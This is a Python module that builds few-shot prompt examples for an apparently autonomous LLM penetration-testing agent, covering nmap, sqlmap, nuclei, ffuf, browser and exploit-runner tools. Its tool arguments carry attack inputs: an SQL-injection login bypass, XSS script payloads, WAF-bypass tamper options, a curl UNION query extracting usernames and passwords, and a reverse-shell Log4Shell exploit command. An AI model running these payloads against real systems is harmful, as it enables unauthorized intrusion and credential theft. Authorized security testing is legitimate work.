"""
Few-Shot Examples System - Phase 4 Intelligence

Impact: +25% tool accuracy (Brown et al. 2020)

Provides 2-3 concrete examples (2 good + 1 bad) for each tool.
LLM learns from examples how to use tools correctly.
"""

from dataclasses import dataclass
from typing import Literal

@dataclass
class ToolExample:
    """A single few-shot example for a tool."""
    scenario: str  # User request
    thinking: str  # Chain-of-thought reasoning
    tool_name: str
    tool_args: dict
    expected_result: str
    is_good: bool  # True = good example, False = anti-pattern


# ═══════════════════════════════════════════════════════════════════════════
# NMAP EXAMPLES
# ═══════════════════════════════════════════════════════════════════════════

NMAP_EXAMPLES = [
    ToolExample(
        scenario="What services are running on 192.168.1.100?",
        thinking="""
1. Need: List of services with versions
2. Tool: nmap with service detection
3. Arguments: target=192.168.1.100, scan_type='service' (need versions)
4. Expect: Services like "22/tcp ssh OpenSSH 7.4"
""",
        tool_name="nmap",
        tool_args={"target": "192.168.1.100", "scan_type": "service"},
        expected_result="22/tcp ssh OpenSSH 7.4, 80/tcp http Apache 2.4.6",
        is_good=True,
    ),
    ToolExample(
        scenario="Quick check if 10.0.0.5 is up",
        thinking="""
1. Need: Just know if host responds
2. Tool: nmap with quick scan (don't need full port scan)
3. Arguments: target=10.0.0.5, scan_type='quick'
4. Expect: Host status and common ports
""",
        tool_name="nmap",
        tool_args={"target": "10.0.0.5", "scan_type": "quick"},
        expected_result="Host is up. Open ports: 22, 80, 443",
        is_good=True,
    ),
    ToolExample(
        scenario="Scan entire network 192.168.1.0/24",
        thinking="""
[-] BAD: Scanning entire subnets without permission
- Too noisy (254 hosts)
- May trigger IDS/IPS
- Likely out of scope
- Wastes time and money
""",
        tool_name="nmap",
        tool_args={"target": "192.168.1.0/24", "scan_type": "service"},
        expected_result="DON'T DO THIS - too broad, likely unauthorized",
        is_good=False,
    ),
]

# ═══════════════════════════════════════════════════════════════════════════
# HTTP EXAMPLES
# ═══════════════════════════════════════════════════════════════════════════

HTTP_EXAMPLES = [
    ToolExample(
        scenario="Check if /admin page exists (simple GET)",
        thinking="""
1. Need: Test if admin panel accessible
2. Tool: http with GET request (simple check, no JavaScript needed)
3. Arguments: GET /admin
4. Expect: 200 (exists), 404 (not found), or 403 (exists but denied)
""",
        tool_name="http",
        tool_args={
            "url": "http://target.com/admin",
            "method": "GET",
        },
        expected_result="200 OK - Admin panel found (use browser tools to explore it)",
        is_good=True,
    ),
    ToolExample(
        scenario="Test login form for SQLi",
        thinking="""
1. Need: Check if SQLi vulnerable in login form
2. Tool: http with manual payload (faster than sqlmap, good for initial test)
3. Arguments: POST to /login with username="' OR '1'='1"
4. Expect: If vulnerable → 200 + logged in. If not → error
5. Note: For XSS in same form, use browser_fill instead (needs visual proof)
""",
        tool_name="http",
        tool_args={
            "url": "http://target.com/login",
            "method": "POST",
            "data": {"username": "' OR '1'='1", "password": "anything"},
        },
        expected_result="200 OK - Logged in as admin (VULNERABLE!)",
        is_good=True,
    ),
    ToolExample(
        scenario="Test XSS in search parameter",
        thinking="""
[-] BAD: Testing XSS with http tool alone (no visual proof)
- XSS REQUIRES browser tools for screenshot evidence
- http can detect payload reflection but not execution
- Use browser_fill + browser_screenshot instead
- ALWAYS get visual proof for XSS
""",
        tool_name="http",
        tool_args={
            "url": "http://target.com/search?q=<script>alert(1)</script>",
            "method": "GET",
        },
        expected_result="Use browser_fill + browser_screenshot instead for XSS",
        is_good=False,
    ),
]

# ═══════════════════════════════════════════════════════════════════════════
# NUCLEI EXAMPLES
# ═══════════════════════════════════════════════════════════════════════════

NUCLEI_EXAMPLES = [
    ToolExample(
        scenario="Scan for known CVEs on https://target.com",
        thinking="""
1. Need: Find known vulnerabilities
2. Tool: nuclei (specialized for CVE scanning)
3. Arguments: target URL, use default templates
4. Expect: List of CVEs if found
""",
        tool_name="nuclei",
        tool_args={
            "target": "https://target.com",
            "templates": [],  # Use all default templates
        },
        expected_result="CVE-2021-44228 (Log4Shell) found on /api/logs",
        is_good=True,
    ),
    ToolExample(
        scenario="Quick check for exposed config files",
        thinking="""
1. Need: Find .git, .env, config.php exposed
2. Tool: nuclei with specific templates
3. Arguments: target + exposures templates
4. Expect: Exposed sensitive files
""",
        tool_name="nuclei",
        tool_args={
            "target": "https://target.com",
            "templates": ["exposures"],
        },
        expected_result=".git/config exposed, .env file accessible",
        is_good=True,
    ),
    ToolExample(
        scenario="First step: check target.com",
        thinking="""
[-] BAD: Using nuclei as first reconnaissance tool
- Nuclei is NOISY (thousands of requests)
- Use after basic recon (nmap, http)
- Start with manual tests first
""",
        tool_name="nuclei",
        tool_args={"target": "https://target.com", "templates": []},
        expected_result="DON'T start with nuclei - too noisy, use after recon",
        is_good=False,
    ),
]

# ═══════════════════════════════════════════════════════════════════════════
# SQLMAP EXAMPLES
# ═══════════════════════════════════════════════════════════════════════════

SQLMAP_EXAMPLES = [
    ToolExample(
        scenario="Confirmed SQLi in /search?q=test, extract database",
        thinking="""
1. Need: Extract database (SQLi already confirmed manually)
2. Tool: sqlmap (automated extraction)
3. Arguments: URL with parameter, enumerate databases
4. Expect: List of databases
""",
        tool_name="sqlmap",
        tool_args={
            "url": "http://target.com/search?q=test",
            "options": ["--dbs"],
        },
        expected_result="Databases: mysql, information_schema, webapp_db",
        is_good=True,
    ),
    ToolExample(
        scenario="SQLMap failed with WAF detected, retry with tamper",
        thinking="""
1. Need: Bypass WAF to test SQLi
2. Tool: sqlmap with tamper scripts
3. Arguments: URL + tamper=space2comment,between
4. Expect: WAF bypassed, SQLi confirmed
""",
        tool_name="sqlmap",
        tool_args={
            "url": "http://target.com/search?q=test",
            "options": ["--tamper=space2comment,between", "--dbs"],
        },
        expected_result="WAF bypassed! Databases found.",
        is_good=True,
    ),
    ToolExample(
        scenario="Test /login for SQL injection",
        thinking="""
[-] BAD: Running sqlmap without manual confirmation first
- SQLMap is SLOW (minutes)
- Often blocked by WAF
- Start with manual test: ' OR '1'='1
- Only use sqlmap after confirming SQLi exists
""",
        tool_name="sqlmap",
        tool_args={
            "url": "http://target.com/login",
            "options": ["--forms", "--dbs"],
        },
        expected_result="Test manually with http tool first: ' OR '1'='1",
        is_good=False,
    ),
]

# ═══════════════════════════════════════════════════════════════════════════
# BROWSER EXAMPLES (NEW - Phase 4)
# ═══════════════════════════════════════════════════════════════════════════

BROWSER_EXAMPLES = [
    ToolExample(
        scenario="Test XSS in search field on /search page",
        thinking="""
1. Need: Check if search field vulnerable to XSS
2. Tool: browser_fill (interact with JavaScript-rendered page)
3. Arguments: url, selector for search field, XSS payload
4. Expect: If vulnerable → payload executes, visible in HTML
""",
        tool_name="browser_fill",
        tool_args={
            "url": "http://target.com/search",
            "selector": "input[name='q']",
            "value": "<script>alert('XSS')</script>",
            "submit": True,
        },
        expected_result="Page shows alert or script tag in DOM (XSS confirmed)",
        is_good=True,
    ),
    ToolExample(
        scenario="Take screenshot of /dashboard to verify XSS payload executed",
        thinking="""
1. Need: Visual proof that XSS executed
2. Tool: browser_screenshot (capture rendered page)
3. Arguments: url with XSS payload, filename for evidence
4. Expect: Screenshot showing alert() or injected content
""",
        tool_name="browser_screenshot",
        tool_args={
            "url": "http://target.com/dashboard?name=<script>alert(1)</script>",
            "filename": "xss_proof.png",
        },
        expected_result="Screenshot saved showing alert box (XSS confirmed)",
        is_good=True,
    ),
    ToolExample(
        scenario="Navigate to JavaScript-heavy SPA to see rendered content",
        thinking="""
1. Need: Get content from React/Vue/Angular app
2. Tool: browser_navigate (renders JavaScript unlike http tool)
3. Arguments: url, wait_for='networkidle' for full render
4. Expect: Fully rendered HTML including JS-generated content
""",
        tool_name="browser_navigate",
        tool_args={
            "url": "http://target.com/dashboard",
            "wait_for": "networkidle",
        },
        expected_result="Full rendered HTML with React components",
        is_good=True,
    ),
    ToolExample(
        scenario="Check if /admin exists",
        thinking="""
[-] BAD: Using browser for simple page check
- Browser is HEAVY (launches Chromium, slow startup)
- Use 'http' tool for simple existence checks
- Browser ONLY for:
  * JavaScript-heavy apps
  * XSS testing requiring interaction
  * Screenshot evidence
  * CSRF/clickjacking tests
""",
        tool_name="browser_navigate",
        tool_args={
            "url": "http://target.com/admin",
        },
        expected_result="Use 'http' tool instead - faster and lighter",
        is_good=False,
    ),
]

# ═══════════════════════════════════════════════════════════════════════════
# FFUF EXAMPLES
# ═══════════════════════════════════════════════════════════════════════════

FFUF_EXAMPLES = [
    ToolExample(
        scenario="Find hidden directories on target.com",
        thinking="""
1. Need: Discover hidden paths/directories
2. Tool: ffuf (fast web fuzzer, much faster than manual checks)
3. Arguments: url with FUZZ placeholder, wordlist=common.txt
4. Expect: List of valid paths (filtered by status code)
""",
        tool_name="ffuf",
        tool_args={
            "url": "http://target.com/FUZZ",
            "wordlist": "/usr/share/seclists/Discovery/Web-Content/common.txt",
        },
        expected_result="/admin (200), /backup (403), /api (301)",
        is_good=True,
    ),
    ToolExample(
        scenario="Fuzz for PHP files on target with .php extension",
        thinking="""
1. Need: Find PHP files on web server
2. Tool: ffuf with extensions filter
3. Arguments: url with FUZZ, extensions=.php,.bak
4. Expect: Discovered PHP files
""",
        tool_name="ffuf",
        tool_args={
            "url": "http://target.com/FUZZ",
            "wordlist": "/usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt",
            "extensions": ".php,.bak,.old",
            "filter_codes": "404",
        },
        expected_result="config.php.bak (200), admin.php (302), debug.php (200)",
        is_good=True,
    ),
    ToolExample(
        scenario="Fuzz with huge wordlist and no filters",
        thinking="""
[-] BAD: Running ffuf with massive wordlist and no filtering
- Generates enormous output
- Most results are false positives
- Always filter by response code or size
- Use targeted wordlists, not mega lists
""",
        tool_name="ffuf",
        tool_args={
            "url": "http://target.com/FUZZ",
            "wordlist": "/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt",
        },
        expected_result="DON'T - use smaller wordlists and filter results",
        is_good=False,
    ),
]

# ═══════════════════════════════════════════════════════════════════════════
# RUN_EXPLOIT EXAMPLES
# ═══════════════════════════════════════════════════════════════════════════

RUN_EXPLOIT_EXAMPLES = [
    ToolExample(
        scenario="Run a reverse shell exploit after confirming RCE",
        thinking="""
1. Need: Exploit confirmed RCE vulnerability
2. Tool: run_exploit (generic exploit runner with logging)
3. Arguments: command with exploit script, description
4. Expect: Shell or evidence of code execution
""",
        tool_name="run_exploit",
        tool_args={
            "command": "python3 /tmp/exploit.py --target 10.0.0.5 --port 8080 --lhost 10.0.0.1",
            "description": "RCE exploit for CVE-2021-44228 (Log4Shell)",
            "timeout": 30,
        },
        expected_result="Shell obtained or command output showing RCE",
        is_good=True,
    ),
    ToolExample(
        scenario="Run SQLi data extraction after confirming injection",
        thinking="""
1. Need: Extract sensitive data via confirmed SQLi
2. Tool: run_exploit with custom SQL payload
3. Arguments: curl with SQLi payload
4. Expect: Database contents
""",
        tool_name="run_exploit",
        tool_args={
            "command": "curl -s 'http://target.com/api/users?id=1 UNION SELECT username,password FROM users--'",
            "description": "SQLi UNION extraction from /api/users",
            "timeout": 15,
        },
        expected_result="Extracted usernames and password hashes",
        is_good=True,
    ),
    ToolExample(
        scenario="Run exploit without confirming vulnerability first",
        thinking="""
[-] BAD: Running exploits before confirming the vulnerability
- Always confirm vuln exists before exploiting
- Use recon tools first (nmap, http, nuclei)
- Blind exploitation wastes time and is noisy
- Confirm, THEN exploit
""",
        tool_name="run_exploit",
        tool_args={
            "command": "msfconsole -q -x 'use exploit/multi/handler; set PAYLOAD ...'",
            "description": "Trying random exploit",
        },
        expected_result="CONFIRM vulnerability first, then exploit",
        is_good=False,
    ),
]

# ═══════════════════════════════════════════════════════════════════════════
# REGISTRY
# ═══════════════════════════════════════════════════════════════════════════

ALL_EXAMPLES = {
    "nmap": NMAP_EXAMPLES,
    "http": HTTP_EXAMPLES,
    "nuclei": NUCLEI_EXAMPLES,
    "sqlmap": SQLMAP_EXAMPLES,
    "browser": BROWSER_EXAMPLES,
    "ffuf": FFUF_EXAMPLES,
    "run_exploit": RUN_EXPLOIT_EXAMPLES,
}


def get_few_shot_examples(tool_name: str) -> list[ToolExample]:
    """Get few-shot examples for a specific tool.
    
    For browser tools (browser_*), returns all browser examples since they share common patterns.
    """
    # Browser tools get all browser examples
    if tool_name.startswith('browser_'):
        return ALL_EXAMPLES.get('browser', [])
    
    # Other tools get exact matches
    return ALL_EXAMPLES.get(tool_name, [])


def format_examples_for_prompt(tool_name: str) -> str:
    """Format few-shot examples for inclusion in system prompt."""
    examples = get_few_shot_examples(tool_name)
    if not examples:
        return ""
    
    prompt = f"\n### {tool_name.upper()} - Few-Shot Examples\n\n"
    
    for i, ex in enumerate(examples, 1):
        marker = "[+] GOOD" if ex.is_good else "[-] BAD"
        prompt += f"**Example {i}: {marker}**\n\n"
        prompt += f"Scenario: \"{ex.scenario}\"\n\n"
        prompt += f"Thinking:\n{ex.thinking}\n\n"
        prompt += f"Tool: `{ex.tool_name}`\n"
        prompt += f"Arguments: `{ex.tool_args}`\n\n"
        prompt += f"Expected: {ex.expected_result}\n\n"
        prompt += "---\n\n"
    
    return prompt


def format_all_examples_for_prompt() -> str:
    """Format all few-shot examples for system prompt."""
    prompt = "\n## Few-Shot Examples\n\n"
    prompt += "Learn from these examples how to use tools correctly:\n\n"
    
    for tool_name in ALL_EXAMPLES.keys():
        prompt += format_examples_for_prompt(tool_name)
    
    return prompt


# ═══════════════════════════════════════════════════════════════════════════
# TESTING
# ═══════════════════════════════════════════════════════════════════════════

if __name__ == "__main__":
    # Test: Print formatted examples
    print(format_all_examples_for_prompt())
    
    # Verify counts
    print("\n" + "="*70)
    print("Few-Shot Examples Summary:")
    print("="*70)
    for tool, examples in ALL_EXAMPLES.items():
        good = sum(1 for ex in examples if ex.is_good)
        bad = sum(1 for ex in examples if not ex.is_good)
        print(f"{tool:10s}: {len(examples)} total ({good} good, {bad} bad)")
    print("="*70)
